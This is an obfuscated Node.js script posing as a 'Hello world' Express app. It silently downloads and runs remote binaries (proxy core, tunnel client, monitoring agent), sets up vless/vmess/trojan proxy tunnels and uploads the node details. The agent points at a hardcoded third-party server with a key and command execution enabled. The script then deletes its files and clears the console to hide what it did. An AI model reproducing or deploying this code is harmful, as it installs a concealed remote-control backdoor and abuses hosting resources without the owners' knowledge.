const _0x12d6c0=_0x4b5a;(function(_0x22539b,_0x4aa0c9){const _0x55c487=_0x4b5a,_0xdc2913=_0x22539b();while(!![]){try{const _0x561cac=-parseInt(_0x55c487(0x1c7))/0x1+parseInt(_0x55c487(0x1fb))/0x2*(-parseInt(_0x55c487(0x1ee))/0x3)+parseInt(_0x55c487(0x1f0))/0x4*(-parseInt(_0x55c487(0x1f8))/0x5)+parseInt(_0x55c487(0x1a2))/0x6+-parseInt(_0x55c487(0x210))/0x7+-parseInt(_0x55c487(0x183))/0x8*(-parseInt(_0x55c487(0x20b))/0x9)+parseInt(_0x55c487(0x1ce))/0xa;if(_0x561cac===_0x4aa0c9)break;else _0xdc2913['push'](_0xdc2913['shift']());}catch(_0x29f7b9){_0xdc2913['push'](_0xdc2913['shift']());}}}(_0x4404,0xed215));function _0x4404(){const _0x306905=['ngg.976896.xyz:8008','tcp','env','2087','https://amd64.ssss.nyc.mn/agent','writeFileSync','nohup\x20','config.json','join','automatic\x20access\x20task\x20added\x20successfully','match','Empowerment\x20failed\x20for\x20','Empowerment\x20success\x20for\x20','response','--tls','forEach','status','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','blackhole','readFileSync','9721620vqLOqN','lew','taskkill\x20/f\x20/im\x20','/sub.txt\x20saved\x20successfully','/vmess-argo','del\x20/f\x20/q\x20','true','application/json','2096','substring','PROJECT_URL','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','CFIP','map','stringify','Subscription\x20uploaded\x20successfully','Content-Type','push','/vless-argo','NEZHA_SERVER','\x20-p\x20','cdns.doon.eu.org','ARGO_PORT','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','fileUrl','mkdirSync','platform','trojan','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','filter','php\x20running\x20error:\x20','firefox','\x0avless://','floor','TunnelSecret','express','1361269QsxlNH','clear','trim','existsSync','stream','ARGO_DOMAIN','2083','15859540TaKQOv','axios','8fd66b82-be8c-40e6-b691-1e95e96d48bd','ARGO_DOMAIN:','log','&fp=firefox&type=ws&host=','config.yaml','data','quic','AUTO_ACCESS','sub.txt','ArgoDomain:','arm64','\x20-c\x20\x22','tunnel.json','text/plain;\x20charset=utf-8','vless','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','https+local://8.8.8.8/dns-query','/vmess-argo?ed=2560','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','/api/delete-nodes','NAME','Error\x20executing\x20command:\x20','\x20is\x20created','/trojan-argo','fileName','chmod','?encryption=none&security=tls&sni=','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','\x0a\x20\x20credentials-file:\x20','/api/add-nodes','9UxflGu','charAt','266260HjGsmn','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','basename','App\x20is\x20running','\x20-c\x20','UUID','ARGO_AUTH','Skipping\x20adding\x20automatic\x20access\x20task','5VmLtak','length','tunnel.yml','631790VixWOY','\x20-s\x20','readdirSync','error','none','\x20>/dev/null\x202>&1\x20&','includes','CFPORT','tls','.exe\x20>\x20nul\x202>&1','send','sub','list.txt','2053','eyJhIjoiN2EwMDEzYzYwMzA3ZTM3NGZiYzI2N2UwMGIwMWM1MjUiLCJ0IjoiNzQ4MTJlMWEtYTE0My00NGEzLTljOWQtZWEwNGU3NjU1NmMwIiwicyI6Ik5qSTROamt3WlRBdE1qUTVZeTAwTXpRMUxUZzROakl0TTJZMk5HSXlOVFkxTXpReCJ9','\x0a\x20\x20\x0atrojan://','6453RENcKw','http\x20server\x20is\x20running\x20on\x20port:','child_process','from','split','4853037azHoyG','utf-8','\x0a\x20\x20tunnel:\x20','aarch64','message','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','SUB_PATH','xtls-rprx-vision','post','/api/add-subscriptions','exec','unlinkSync','then','get','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','all','isFile','\x22\x20>\x20/dev/null\x202>&1','127.0.0.1','\x0aclient_secret:\x20','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','443','\x20failed:\x20','util','pop','https://arm64.ssss.nyc.mn/bot','unlink','PORT','toString','https://arm64.ssss.nyc.mn/agent','\x0a\x20\x20\x20\x20','Download\x20','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','direct','/tunnel.yml\x20run','catch','\x20is\x20running','Add\x20automatic\x20access\x20task\x20faild:\x20','NEZHA_KEY','\x20>/dev/null\x202>&1','win32','https://oooo.serv00.net/add-url','\x20successfully','https://amd64.ssss.nyc.mn/web','8443','Nodes\x20uploaded\x20successfully','arch','test','\x20>\x20nul\x202>&1','http','/dev/null','UPLOAD_URL','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','9304VzYxEW','https://arm64.ssss.nyc.mn/web','finish','false','base64','boot.log','curl\x20-sm\x205\x20https://speed.cloudflare.com/meta\x20|\x20awk\x20-F\x5c\x22\x20\x27{print\x20$26\x22-\x22$18}\x27\x20|\x20sed\x20-e\x20\x27s/\x20/_/g\x27','arm','random','Hello\x20world!','unshift'];_0x4404=function(){return _0x306905;};return _0x4404();}const express=require(_0x12d6c0(0x1c6)),app=express(),axios=require(_0x12d6c0(0x1cf)),os=require('os'),fs=require('fs'),path=require('path'),{promisify}=require(_0x12d6c0(0x228)),exec=promisify(require(_0x12d6c0(0x20d))[_0x12d6c0(0x21a)]),{execSync}=require(_0x12d6c0(0x20d)),UPLOAD_URL=process[_0x12d6c0(0x190)][_0x12d6c0(0x180)]||'',PROJECT_URL=process[_0x12d6c0(0x190)][_0x12d6c0(0x1ac)]||'',AUTO_ACCESS=process[_0x12d6c0(0x190)][_0x12d6c0(0x1d7)]||![],FILE_PATH=process[_0x12d6c0(0x190)]['FILE_PATH']||'./tmp',SUB_PATH=process[_0x12d6c0(0x190)][_0x12d6c0(0x216)]||_0x12d6c0(0x206),PORT=process[_0x12d6c0(0x190)]['SERVER_PORT']||process[_0x12d6c0(0x190)][_0x12d6c0(0x22c)]||0xbb8,UUID=process[_0x12d6c0(0x190)][_0x12d6c0(0x1f5)]||_0x12d6c0(0x1d0),NEZHA_SERVER=process[_0x12d6c0(0x190)][_0x12d6c0(0x1b5)]||_0x12d6c0(0x18e),NEZHA_PORT=process[_0x12d6c0(0x190)]['NEZHA_PORT']||'',NEZHA_KEY=process['env'][_0x12d6c0(0x237)]||'vsfVI1idVtSdksHE5FTNTRN331Er9R5b',ARGO_DOMAIN=process[_0x12d6c0(0x190)][_0x12d6c0(0x1cc)]||'lew.xiaoxif.ggff.net',ARGO_AUTH=process[_0x12d6c0(0x190)][_0x12d6c0(0x1f6)]||_0x12d6c0(0x209),ARGO_PORT=process[_0x12d6c0(0x190)][_0x12d6c0(0x1b8)]||0x1f41,CFIP=process[_0x12d6c0(0x190)][_0x12d6c0(0x1ae)]||_0x12d6c0(0x1b7),CFPORT=process[_0x12d6c0(0x190)][_0x12d6c0(0x202)]||0x1bb,NAME=process['env'][_0x12d6c0(0x1e4)]||_0x12d6c0(0x1a3);!fs[_0x12d6c0(0x1ca)](FILE_PATH)?(fs[_0x12d6c0(0x1bb)](FILE_PATH),console[_0x12d6c0(0x1d2)](FILE_PATH+_0x12d6c0(0x1e6))):console['log'](FILE_PATH+'\x20already\x20exists');function generateRandomName(){const _0x576cbc=_0x12d6c0,_0x43676e='abcdefghijklmnopqrstuvwxyz';let _0x54f4f5='';for(let _0x1d660f=0x0;_0x1d660f<0x6;_0x1d660f++){_0x54f4f5+=_0x43676e['charAt'](Math[_0x576cbc(0x1c4)](Math[_0x576cbc(0x18b)]()*_0x43676e['length']));}return _0x54f4f5;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x12d6c0(0x196)](FILE_PATH,npmName),phpPath=path['join'](FILE_PATH,phpName),webPath=path['join'](FILE_PATH,webName),botPath=path[_0x12d6c0(0x196)](FILE_PATH,botName),subPath=path[_0x12d6c0(0x196)](FILE_PATH,_0x12d6c0(0x1d8)),listPath=path[_0x12d6c0(0x196)](FILE_PATH,_0x12d6c0(0x207)),bootLogPath=path[_0x12d6c0(0x196)](FILE_PATH,_0x12d6c0(0x188)),configPath=path[_0x12d6c0(0x196)](FILE_PATH,_0x12d6c0(0x195));function deleteNodes(){const _0x19019d=_0x12d6c0;try{if(!UPLOAD_URL)return;if(!fs['existsSync'](subPath))return;let _0x6c4199;try{_0x6c4199=fs[_0x19019d(0x1a1)](subPath,'utf-8');}catch{return null;}const _0x510f1f=Buffer[_0x19019d(0x20e)](_0x6c4199,_0x19019d(0x187))[_0x19019d(0x22d)](_0x19019d(0x211)),_0x514f2a=_0x510f1f[_0x19019d(0x20f)]('\x0a')['filter'](_0xed9d2b=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0xed9d2b));if(_0x514f2a[_0x19019d(0x1f9)]===0x0)return;return axios[_0x19019d(0x218)](UPLOAD_URL+_0x19019d(0x1e3),JSON[_0x19019d(0x1b0)]({'nodes':_0x514f2a}),{'headers':{'Content-Type':_0x19019d(0x1a9)}})['catch'](_0x409b76=>{return null;}),null;}catch(_0x184c1a){return null;}}function _0x4b5a(_0x8480ba,_0x3fbbab){_0x8480ba=_0x8480ba-0x17b;const _0x440499=_0x4404();let _0x4b5a78=_0x440499[_0x8480ba];return _0x4b5a78;}function cleanupOldFiles(){const _0x7dc8c9=_0x12d6c0;try{const _0x5a2d83=fs[_0x7dc8c9(0x1fd)](FILE_PATH);_0x5a2d83['forEach'](_0x4152e0=>{const _0x31c5bc=_0x7dc8c9,_0x83703e=path[_0x31c5bc(0x196)](FILE_PATH,_0x4152e0);try{const _0x1f1e93=fs['statSync'](_0x83703e);_0x1f1e93[_0x31c5bc(0x220)]()&&fs[_0x31c5bc(0x21b)](_0x83703e);}catch(_0x380445){}});}catch(_0x4cb962){}}app[_0x12d6c0(0x21d)]('/',function(_0x19395f,_0x2f9ace){const _0x137cc1=_0x12d6c0;_0x2f9ace[_0x137cc1(0x205)](_0x137cc1(0x18c));});async function generateConfig(){const _0x224509=_0x12d6c0,_0x1a72c5={'log':{'access':_0x224509(0x17f),'error':_0x224509(0x17f),'loglevel':'none'},'inbounds':[{'port':ARGO_PORT,'protocol':'vless','settings':{'clients':[{'id':UUID,'flow':_0x224509(0x217)}],'decryption':_0x224509(0x1ff),'fallbacks':[{'dest':0xbb9},{'path':_0x224509(0x1b4),'dest':0xbba},{'path':_0x224509(0x1a6),'dest':0xbbb},{'path':_0x224509(0x1e7),'dest':0xbbc}]},'streamSettings':{'network':'tcp'}},{'port':0xbb9,'listen':_0x224509(0x222),'protocol':'vless','settings':{'clients':[{'id':UUID}],'decryption':_0x224509(0x1ff)},'streamSettings':{'network':_0x224509(0x18f),'security':_0x224509(0x1ff)}},{'port':0xbba,'listen':_0x224509(0x222),'protocol':_0x224509(0x1de),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x224509(0x1ff)},'streamSettings':{'network':'ws','security':_0x224509(0x1ff),'wsSettings':{'path':'/vless-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0x224509(0x17e),_0x224509(0x203),'quic'],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x224509(0x222),'protocol':'vmess','settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x224509(0x1a6)}},'sniffing':{'enabled':!![],'destOverride':[_0x224509(0x17e),_0x224509(0x203),_0x224509(0x1d6)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x224509(0x222),'protocol':_0x224509(0x1bd),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x224509(0x1ff),'wsSettings':{'path':'/trojan-argo'}},'sniffing':{'enabled':!![],'destOverride':['http',_0x224509(0x203),_0x224509(0x1d6)],'metadataOnly':![]}}],'dns':{'servers':[_0x224509(0x1e0)]},'outbounds':[{'protocol':'freedom','tag':_0x224509(0x232)},{'protocol':_0x224509(0x1a0),'tag':'block'}]};fs[_0x224509(0x193)](path[_0x224509(0x196)](FILE_PATH,_0x224509(0x195)),JSON[_0x224509(0x1b0)](_0x1a72c5,null,0x2));}function getSystemArchitecture(){const _0x17fcdc=_0x12d6c0,_0x36839c=os[_0x17fcdc(0x17b)]();return _0x36839c==='arm'||_0x36839c===_0x17fcdc(0x1da)||_0x36839c===_0x17fcdc(0x213)?_0x17fcdc(0x18a):'amd';}function downloadFile(_0x349b05,_0x2f4a6f,_0x467872){const _0xc55a79=_0x12d6c0,_0x20a587=_0x349b05;!fs[_0xc55a79(0x1ca)](FILE_PATH)&&fs[_0xc55a79(0x1bb)](FILE_PATH,{'recursive':!![]});const _0xf476a5=fs['createWriteStream'](_0x20a587);axios({'method':_0xc55a79(0x21d),'url':_0x2f4a6f,'responseType':_0xc55a79(0x1cb)})[_0xc55a79(0x21c)](_0x543e55=>{const _0x2ad9ce=_0xc55a79;_0x543e55[_0x2ad9ce(0x1d5)]['pipe'](_0xf476a5),_0xf476a5['on'](_0x2ad9ce(0x185),()=>{const _0x1923a3=_0x2ad9ce;_0xf476a5['close'](),console['log'](_0x1923a3(0x230)+path['basename'](_0x20a587)+_0x1923a3(0x23b)),_0x467872(null,_0x20a587);}),_0xf476a5['on'](_0x2ad9ce(0x1fe),_0x2725d6=>{const _0x32ee38=_0x2ad9ce;fs[_0x32ee38(0x22b)](_0x20a587,()=>{});const _0x57a82d=_0x32ee38(0x230)+path[_0x32ee38(0x1f2)](_0x20a587)+'\x20failed:\x20'+_0x2725d6[_0x32ee38(0x214)];console[_0x32ee38(0x1fe)](_0x57a82d),_0x467872(_0x57a82d);});})[_0xc55a79(0x234)](_0x1cf819=>{const _0x518be8=_0xc55a79,_0x161802='Download\x20'+path[_0x518be8(0x1f2)](_0x20a587)+_0x518be8(0x227)+_0x1cf819[_0x518be8(0x214)];console[_0x518be8(0x1fe)](_0x161802),_0x467872(_0x161802);});}async function downloadFilesAndRun(){const _0x15f739=_0x12d6c0,_0x86ccc5=getSystemArchitecture(),_0x2e13b9=getFilesForArchitecture(_0x86ccc5);if(_0x2e13b9[_0x15f739(0x1f9)]===0x0){console[_0x15f739(0x1d2)](_0x15f739(0x1be));return;}const _0x4df68a=_0x2e13b9[_0x15f739(0x1af)](_0x2fa4b5=>{return new Promise((_0x2f0f6f,_0xd4b5fa)=>{const _0x3f8b7b=_0x4b5a;downloadFile(_0x2fa4b5[_0x3f8b7b(0x1e8)],_0x2fa4b5[_0x3f8b7b(0x1ba)],(_0x24ff2e,_0xd5ab13)=>{_0x24ff2e?_0xd4b5fa(_0x24ff2e):_0x2f0f6f(_0xd5ab13);});});});try{await Promise[_0x15f739(0x21f)](_0x4df68a);}catch(_0x398853){console[_0x15f739(0x1fe)]('Error\x20downloading\x20files:',_0x398853);return;}function _0x41ceb7(_0xe7f310){const _0x11fe58=0x1fd;_0xe7f310['forEach'](_0x32aea7=>{const _0x2f4b2e=_0x4b5a;fs['existsSync'](_0x32aea7)&&fs[_0x2f4b2e(0x1e9)](_0x32aea7,_0x11fe58,_0x585fe3=>{const _0x9e46e5=_0x2f4b2e;_0x585fe3?console[_0x9e46e5(0x1fe)](_0x9e46e5(0x199)+_0x32aea7+':\x20'+_0x585fe3):console[_0x9e46e5(0x1d2)](_0x9e46e5(0x19a)+_0x32aea7+':\x20'+_0x11fe58[_0x9e46e5(0x22d)](0x8));});});}const _0x2053ac=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x41ceb7(_0x2053ac);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0xb9f552=NEZHA_SERVER[_0x15f739(0x201)](':')?NEZHA_SERVER[_0x15f739(0x20f)](':')[_0x15f739(0x229)]():'',_0x3899e9=new Set([_0x15f739(0x226),_0x15f739(0x23d),'2096',_0x15f739(0x191),'2083','2053']),_0x1cd5ea=_0x3899e9['has'](_0xb9f552)?_0x15f739(0x1a8):_0x15f739(0x186),_0x4b34af=_0x15f739(0x223)+NEZHA_KEY+_0x15f739(0x182)+NEZHA_SERVER+_0x15f739(0x224)+_0x1cd5ea+'\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20'+UUID;fs[_0x15f739(0x193)](path[_0x15f739(0x196)](FILE_PATH,_0x15f739(0x1d4)),_0x4b34af);const _0x1e13a0='nohup\x20'+phpPath+_0x15f739(0x1db)+FILE_PATH+_0x15f739(0x1eb);try{await exec(_0x1e13a0),console[_0x15f739(0x1d2)](phpName+_0x15f739(0x235)),await new Promise(_0x33d067=>setTimeout(_0x33d067,0x3e8));}catch(_0x2e98f3){console[_0x15f739(0x1fe)](_0x15f739(0x1c1)+_0x2e98f3);}}else{let _0x352b7c='';const _0x3162fb=[_0x15f739(0x226),_0x15f739(0x23d),_0x15f739(0x1aa),_0x15f739(0x191),_0x15f739(0x1cd),_0x15f739(0x208)];_0x3162fb[_0x15f739(0x201)](NEZHA_PORT)&&(_0x352b7c=_0x15f739(0x19c));const _0x5e7eaa=_0x15f739(0x194)+npmPath+_0x15f739(0x1fc)+NEZHA_SERVER+':'+NEZHA_PORT+_0x15f739(0x1b6)+NEZHA_KEY+'\x20'+_0x352b7c+_0x15f739(0x181);try{await exec(_0x5e7eaa),console[_0x15f739(0x1d2)](npmName+'\x20is\x20running'),await new Promise(_0x1f81eb=>setTimeout(_0x1f81eb,0x3e8));}catch(_0xa88e6f){console[_0x15f739(0x1fe)]('npm\x20running\x20error:\x20'+_0xa88e6f);}}}else console[_0x15f739(0x1d2)]('NEZHA\x20variable\x20is\x20empty,skip\x20running');const _0x1c6e31=_0x15f739(0x194)+webPath+_0x15f739(0x1f4)+FILE_PATH+'/config.json\x20>/dev/null\x202>&1\x20&';try{await exec(_0x1c6e31),console[_0x15f739(0x1d2)](webName+'\x20is\x20running'),await new Promise(_0xdd6408=>setTimeout(_0xdd6408,0x3e8));}catch(_0x165c8e){console[_0x15f739(0x1fe)]('web\x20running\x20error:\x20'+_0x165c8e);}if(fs['existsSync'](botPath)){let _0xcf186;if(ARGO_AUTH[_0x15f739(0x198)](/^[A-Z0-9a-z=]{120,250}$/))_0xcf186=_0x15f739(0x1e2)+ARGO_AUTH;else ARGO_AUTH['match'](/TunnelSecret/)?_0xcf186=_0x15f739(0x225)+FILE_PATH+_0x15f739(0x233):_0xcf186='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+_0x15f739(0x215)+ARGO_PORT;try{await exec(_0x15f739(0x194)+botPath+'\x20'+_0xcf186+_0x15f739(0x200)),console[_0x15f739(0x1d2)](botName+_0x15f739(0x235)),await new Promise(_0x81348e=>setTimeout(_0x81348e,0x7d0));}catch(_0x4ed794){console[_0x15f739(0x1fe)](_0x15f739(0x1e5)+_0x4ed794);}}await new Promise(_0x5755e3=>setTimeout(_0x5755e3,0x1388));}function getFilesForArchitecture(_0x482253){const _0x583ac7=_0x12d6c0;let _0x29426c;_0x482253===_0x583ac7(0x18a)?_0x29426c=[{'fileName':webPath,'fileUrl':_0x583ac7(0x184)},{'fileName':botPath,'fileUrl':_0x583ac7(0x22a)}]:_0x29426c=[{'fileName':webPath,'fileUrl':_0x583ac7(0x23c)},{'fileName':botPath,'fileUrl':'https://amd64.ssss.nyc.mn/bot'}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x1ed52b=_0x482253===_0x583ac7(0x18a)?_0x583ac7(0x22e):_0x583ac7(0x192);_0x29426c['unshift']({'fileName':npmPath,'fileUrl':_0x1ed52b});}else{const _0x204071=_0x482253===_0x583ac7(0x18a)?'https://arm64.ssss.nyc.mn/v1':'https://amd64.ssss.nyc.mn/v1';_0x29426c[_0x583ac7(0x18d)]({'fileName':phpPath,'fileUrl':_0x204071});}}return _0x29426c;}function argoType(){const _0x5eb1c4=_0x12d6c0;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x5eb1c4(0x1d2)](_0x5eb1c4(0x1bf));return;}if(ARGO_AUTH[_0x5eb1c4(0x201)](_0x5eb1c4(0x1c5))){fs[_0x5eb1c4(0x193)](path[_0x5eb1c4(0x196)](FILE_PATH,'tunnel.json'),ARGO_AUTH);const _0x5dbe6a=_0x5eb1c4(0x212)+ARGO_AUTH[_0x5eb1c4(0x20f)]('\x22')[0xb]+_0x5eb1c4(0x1ec)+path[_0x5eb1c4(0x196)](FILE_PATH,_0x5eb1c4(0x1dc))+_0x5eb1c4(0x231)+ARGO_DOMAIN+_0x5eb1c4(0x1f1)+ARGO_PORT+_0x5eb1c4(0x21e);fs[_0x5eb1c4(0x193)](path[_0x5eb1c4(0x196)](FILE_PATH,_0x5eb1c4(0x1fa)),_0x5dbe6a);}else console['log'](_0x5eb1c4(0x19f));}argoType();async function extractDomains(){const _0x195574=_0x12d6c0;let _0x27f32f;if(ARGO_AUTH&&ARGO_DOMAIN)_0x27f32f=ARGO_DOMAIN,console[_0x195574(0x1d2)](_0x195574(0x1d1),_0x27f32f),await _0x964e9e(_0x27f32f);else try{const _0x319cbd=fs['readFileSync'](path['join'](FILE_PATH,_0x195574(0x188)),'utf-8'),_0x5cc463=_0x319cbd['split']('\x0a'),_0x20841b=[];_0x5cc463[_0x195574(0x19d)](_0x6d80ba=>{const _0xd591a0=_0x6d80ba['match'](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0xd591a0){const _0x42ed40=_0xd591a0[0x1];_0x20841b['push'](_0x42ed40);}});if(_0x20841b[_0x195574(0x1f9)]>0x0)_0x27f32f=_0x20841b[0x0],console[_0x195574(0x1d2)](_0x195574(0x1d9),_0x27f32f),await _0x964e9e(_0x27f32f);else{console['log'](_0x195574(0x1b9)),fs[_0x195574(0x21b)](path[_0x195574(0x196)](FILE_PATH,_0x195574(0x188)));async function _0x16bae9(){const _0x2b0e17=_0x195574;try{process[_0x2b0e17(0x1bc)]==='win32'?await exec(_0x2b0e17(0x1a4)+botName+_0x2b0e17(0x204)):await exec('pkill\x20-f\x20\x22['+botName[_0x2b0e17(0x1ef)](0x0)+']'+botName[_0x2b0e17(0x1ab)](0x1)+_0x2b0e17(0x221));}catch(_0x3ba572){}}_0x16bae9(),await new Promise(_0x24ab87=>setTimeout(_0x24ab87,0xbb8));const _0x5dd881=_0x195574(0x1ad)+FILE_PATH+_0x195574(0x215)+ARGO_PORT;try{await exec('nohup\x20'+botPath+'\x20'+_0x5dd881+_0x195574(0x200)),console[_0x195574(0x1d2)](botName+_0x195574(0x235)),await new Promise(_0x18c081=>setTimeout(_0x18c081,0xbb8)),await extractDomains();}catch(_0x5decbc){console['error'](_0x195574(0x1e5)+_0x5decbc);}}}catch(_0x5cf18a){console['error']('Error\x20reading\x20boot.log:',_0x5cf18a);}async function _0x964e9e(_0x209f1e){const _0x183a75=_0x195574,_0x106d8b=execSync(_0x183a75(0x189),{'encoding':'utf-8'}),_0x51901b=_0x106d8b[_0x183a75(0x1c9)](),_0x54e549=NAME?NAME+'-'+_0x51901b:_0x51901b;return new Promise(_0xc8c7cc=>{setTimeout(()=>{const _0x481bbe=_0x4b5a,_0xf9e94c={'v':'2','ps':''+_0x54e549,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x481bbe(0x1ff),'net':'ws','type':_0x481bbe(0x1ff),'host':_0x209f1e,'path':_0x481bbe(0x1e1),'tls':_0x481bbe(0x203),'sni':_0x209f1e,'alpn':'','fp':_0x481bbe(0x1c2)},_0x3ae55f=_0x481bbe(0x1c3)+UUID+'@'+CFIP+':'+CFPORT+_0x481bbe(0x1ea)+_0x209f1e+_0x481bbe(0x1d3)+_0x209f1e+'&path=%2Fvless-argo%3Fed%3D2560#'+_0x54e549+'\x0a\x20\x20\x0avmess://'+Buffer[_0x481bbe(0x20e)](JSON[_0x481bbe(0x1b0)](_0xf9e94c))[_0x481bbe(0x22d)](_0x481bbe(0x187))+_0x481bbe(0x20a)+UUID+'@'+CFIP+':'+CFPORT+'?security=tls&sni='+_0x209f1e+_0x481bbe(0x1d3)+_0x209f1e+'&path=%2Ftrojan-argo%3Fed%3D2560#'+_0x54e549+_0x481bbe(0x22f);console[_0x481bbe(0x1d2)](Buffer[_0x481bbe(0x20e)](_0x3ae55f)[_0x481bbe(0x22d)](_0x481bbe(0x187))),fs['writeFileSync'](subPath,Buffer[_0x481bbe(0x20e)](_0x3ae55f)['toString'](_0x481bbe(0x187))),console[_0x481bbe(0x1d2)](FILE_PATH+_0x481bbe(0x1a5)),uploadNodes(),app[_0x481bbe(0x21d)]('/'+SUB_PATH,(_0x52cb37,_0x43ba12)=>{const _0x5116a8=_0x481bbe,_0x57665b=Buffer[_0x5116a8(0x20e)](_0x3ae55f)[_0x5116a8(0x22d)](_0x5116a8(0x187));_0x43ba12['set'](_0x5116a8(0x1b2),_0x5116a8(0x1dd)),_0x43ba12[_0x5116a8(0x205)](_0x57665b);}),_0xc8c7cc(_0x3ae55f);},0x7d0);});}}async function uploadNodes(){const _0x55eb97=_0x12d6c0;if(UPLOAD_URL&&PROJECT_URL){const _0x2d3878=PROJECT_URL+'/'+SUB_PATH,_0x5cff72={'subscription':[_0x2d3878]};try{const _0x4f31c1=await axios[_0x55eb97(0x218)](UPLOAD_URL+_0x55eb97(0x219),_0x5cff72,{'headers':{'Content-Type':'application/json'}});return _0x4f31c1&&_0x4f31c1['status']===0xc8?(console[_0x55eb97(0x1d2)](_0x55eb97(0x1b1)),_0x4f31c1):null;}catch(_0x47c282){if(_0x47c282[_0x55eb97(0x19b)]){if(_0x47c282[_0x55eb97(0x19b)]['status']===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x55eb97(0x1ca)](listPath))return;const _0x2a7e27=fs[_0x55eb97(0x1a1)](listPath,'utf-8'),_0x502bc5=_0x2a7e27[_0x55eb97(0x20f)]('\x0a')[_0x55eb97(0x1c0)](_0x3d2694=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x55eb97(0x17c)](_0x3d2694));if(_0x502bc5['length']===0x0)return;const _0x4260ae=JSON['stringify']({'nodes':_0x502bc5});try{const _0x2e7a7a=await axios[_0x55eb97(0x218)](UPLOAD_URL+_0x55eb97(0x1ed),_0x4260ae,{'headers':{'Content-Type':_0x55eb97(0x1a9)}});return _0x2e7a7a&&_0x2e7a7a[_0x55eb97(0x19e)]===0xc8?(console[_0x55eb97(0x1d2)](_0x55eb97(0x23e)),_0x2e7a7a):null;}catch(_0x26eee2){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x1ccf86=_0x4b5a,_0x4aca1a=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x4aca1a[_0x1ccf86(0x1b3)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x4aca1a[_0x1ccf86(0x1b3)](phpPath);process[_0x1ccf86(0x1bc)]===_0x1ccf86(0x239)?exec(_0x1ccf86(0x1a7)+_0x4aca1a[_0x1ccf86(0x196)]('\x20')+_0x1ccf86(0x17d),_0x511bcc=>{const _0x69fa71=_0x1ccf86;console[_0x69fa71(0x1c8)](),console[_0x69fa71(0x1d2)](_0x69fa71(0x1f3)),console['log'](_0x69fa71(0x1df));}):exec('rm\x20-rf\x20'+_0x4aca1a[_0x1ccf86(0x196)]('\x20')+_0x1ccf86(0x238),_0xc57e30=>{const _0x3d9297=_0x1ccf86;console['clear'](),console['log'](_0x3d9297(0x1f3)),console[_0x3d9297(0x1d2)](_0x3d9297(0x1df));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0xed62df=_0x12d6c0;if(!AUTO_ACCESS||!PROJECT_URL){console[_0xed62df(0x1d2)](_0xed62df(0x1f7));return;}try{const _0x29d8bd=await axios[_0xed62df(0x218)](_0xed62df(0x23a),{'url':PROJECT_URL},{'headers':{'Content-Type':_0xed62df(0x1a9)}});return console[_0xed62df(0x1d2)](_0xed62df(0x197)),_0x29d8bd;}catch(_0x1b6e56){return console[_0xed62df(0x1fe)](_0xed62df(0x236)+_0x1b6e56[_0xed62df(0x214)]),null;}}async function startserver(){const _0x499d03=_0x12d6c0;try{deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x2c29ff){console[_0x499d03(0x1fe)]('Error\x20in\x20startserver:',_0x2c29ff);}}startserver()[_0x12d6c0(0x234)](_0x1d4c2e=>{const _0x130f0e=_0x12d6c0;console[_0x130f0e(0x1fe)]('Unhandled\x20error\x20in\x20startserver:',_0x1d4c2e);}),app['listen'](PORT,()=>console[_0x12d6c0(0x1d2)](_0x12d6c0(0x20c)+PORT+'!'));
